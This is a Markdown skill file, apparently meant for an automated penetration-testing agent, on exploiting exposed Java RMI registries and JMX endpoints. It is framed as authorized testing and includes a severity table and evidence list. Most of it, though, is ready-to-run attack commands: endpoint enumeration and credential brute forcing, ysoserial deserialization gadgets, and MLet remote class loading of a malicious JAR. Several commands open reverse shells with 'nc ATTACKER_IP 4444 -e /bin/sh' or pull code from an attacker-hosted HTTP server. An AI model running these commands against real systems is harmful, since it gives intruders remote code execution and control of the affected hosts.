---
name: attack-java-rmi
description: "Java RMI registry enumeration and exploitation — ysoserial deserialization RCE, JMX/MLet remote class loading, beanshooter/sjet/mjet attack chains"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - java-rmi
  - jmx
  - deserialization
  - rce
  - java
  - attack
tech_stack:
  - java
  - jmx
  - rmi
cwe_ids:
  - CWE-502
  - CWE-284
chains_with:
  - wstg-inpv-14
  - attack-gwt
prerequisites: []
severity_boost:
  wstg-inpv-14: "Unauthenticated RMI/JMX endpoint is a classic incubated vulnerability yielding delayed but full RCE"
  attack-gwt: "Same Java deserialization gadget chains (ysoserial) apply once a serialized object sink is found on either surface"
---

# Java RMI / JMX Exploitation

## Objective

Enumerate exposed Java RMI registries and JMX endpoints, then achieve remote code execution via unauthenticated MLet remote class loading or Java deserialization gadget chains.

## Testing Methodology

### Phase 1: Discovery & Detection

```bash
# Nmap RMI-specific NSE scripts — flags default insecure classloader config
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET -Pn -v

# remote-method-guesser: full port sweep + RMI service fingerprint
git clone https://github.com/qtc-de/remote-method-guesser.git
rmg scan TARGET --ports 0-65535

# Enumerate bound names once a registry port is confirmed (commonly 1099, 1090, 9010)
rmg enum TARGET 1099
```

### Phase 2: Metasploit Auxiliary Scan

```bash
msfconsole -q -x "
use auxiliary/scanner/misc/java_rmi_server;
set RHOSTS TARGET;
set RPORT 1099;
run;
exit"
```

### Phase 3: JMX Enumeration (beanshooter)

```bash
pip install beanshooter   # or: git clone https://github.com/qtc-de/beanshooter

# Full endpoint enumeration (auth requirement, MLet availability, known CVEs)
beanshooter enum TARGET 9010

# List available MBean attributes / registered MBeans
beanshooter info TARGET 9010
beanshooter list TARGET 9010

# Read/write an attribute (proves write access = config tamper primitive)
beanshooter attr TARGET 9010 java.lang:type=Memory Verbose
beanshooter attr TARGET 9010 java.lang:type=Memory Verbose true --type boolean

# Bruteforce a password-protected JMX endpoint
beanshooter brute TARGET 1090
```

### Phase 4: RCE via Deserialization Gadget Chain (beanshooter)

```bash
# Deliver a ysoserial gadget chain to the JMX endpoint directly — no MLet needed
beanshooter serial TARGET 1090 CommonsCollections6 \
  "nc ATTACKER_IP 4444 -e /bin/sh" --username admin --password admin

# Standard MBean command exec primitive (if a suitable standard MBean is exposed)
beanshooter standard TARGET 9010 exec 'nc ATTACKER_IP 4444 -e /bin/sh'

# Invoke arbitrary static/public Java methods for read primitives (e.g. list a dir)
beanshooter model TARGET 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
beanshooter invoke TARGET 9010 de.qtc.beanshooter:version=1 --signature 'list()'
```

### Phase 5: RCE via MLet Remote Class Loading (sjet / mjet)

```text
Prerequisites: JMX server can reach an attacker-controlled HTTP server, and
JMX authentication is disabled (or already bruteforced/bypassed in Phase 3).

Attack flow:
  1. Host an MLet file + malicious MBean JAR on an attacker HTTP server.
  2. Instantiate javax.management.loading.MLet on the target via JMX.
  3. Invoke MLet.getMBeansFromURL(), pointing it at the attacker webserver.
  4. Target downloads and loads the JAR, registering the malicious MBean.
  5. Invoke methods on the newly loaded MBean for full command execution.
```

```bash
# jython required for sjet/mjet
jython sjet.py TARGET TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET TARGET_PORT super_secret command "id"
jython sjet.py TARGET TARGET_PORT super_secret shell
jython sjet.py TARGET TARGET_PORT super_secret uninstall

jython mjet.py TARGET TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET TARGET_PORT command super_secret "whoami"
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET TARGET_PORT \
  deserialize CommonsCollections6 "touch /tmp/pwned"
```

### Phase 6: Metasploit RMI Exploit Module

```bash
msfconsole -q -x "
use exploit/multi/misc/java_rmi_server;
set RHOSTS TARGET;
set RPORT TARGET_PORT;
set LHOST ATTACKER_IP;
run;
exit"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Unauthenticated RMI registry allows remote class loading (default classloader) | Critical (P1) |
| Deserialization RCE via ysoserial gadget chain against JMX/RMI endpoint | Critical (P1) |
| Unauthenticated JMX endpoint with MBean write/invoke access | Critical (P1) |
| Weak/bruteforceable JMX credentials | High (P2) |
| RMI registry bound names disclose internal service topology/class names | Medium (P3) |
| RMI service reachable from an untrusted network segment | Medium (P3) |

## Evidence Requirements

- `rmg enum` / `rmi-dumpregistry` output listing exposed bound names
- Command output or reverse shell callback captured from RCE step
- `beanshooter enum` output confirming auth state and gadget-chain viability
- Screenshot/log of MBean attribute read/write demonstrating impact
- Network path/segment showing the RMI port is reachable from the tested zone

## Tools

- `remote-method-guesser (rmg)` — https://github.com/qtc-de/remote-method-guesser — scan/enum/attack RMI services
- `beanshooter` — https://github.com/qtc-de/beanshooter — JMX enumeration and attack tool
- `sjet` — https://github.com/siberas/sjet — siberas JMX exploitation toolkit
- `mjet` — https://github.com/mogwailabs/mjet — MOGWAI LABS JMX exploitation toolkit
- `ysoserial` — Java deserialization gadget chain generator
- `nmap` (`rmi-dumpregistry`, `rmi-vuln-classloader` NSE scripts)
- `Metasploit` — `auxiliary/scanner/misc/java_rmi_server`, `exploit/multi/misc/java_rmi_server`

## References

- [Attacking RMI based JMX services - Hans-Martin Münch](https://web.archive.org/web/20201024121233/https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
- [JMX RMI - MULTIPLE APPLICATIONS RCE - Red Timmy Security](https://web.archive.org/web/20250523025328/https://www.exploit-db.com/docs/english/46607-jmx-rmi-%E2%80%93-multiple-applications-remote-code-execution.pdf)
- [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel](https://web.archive.org/web/20210817144943/https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
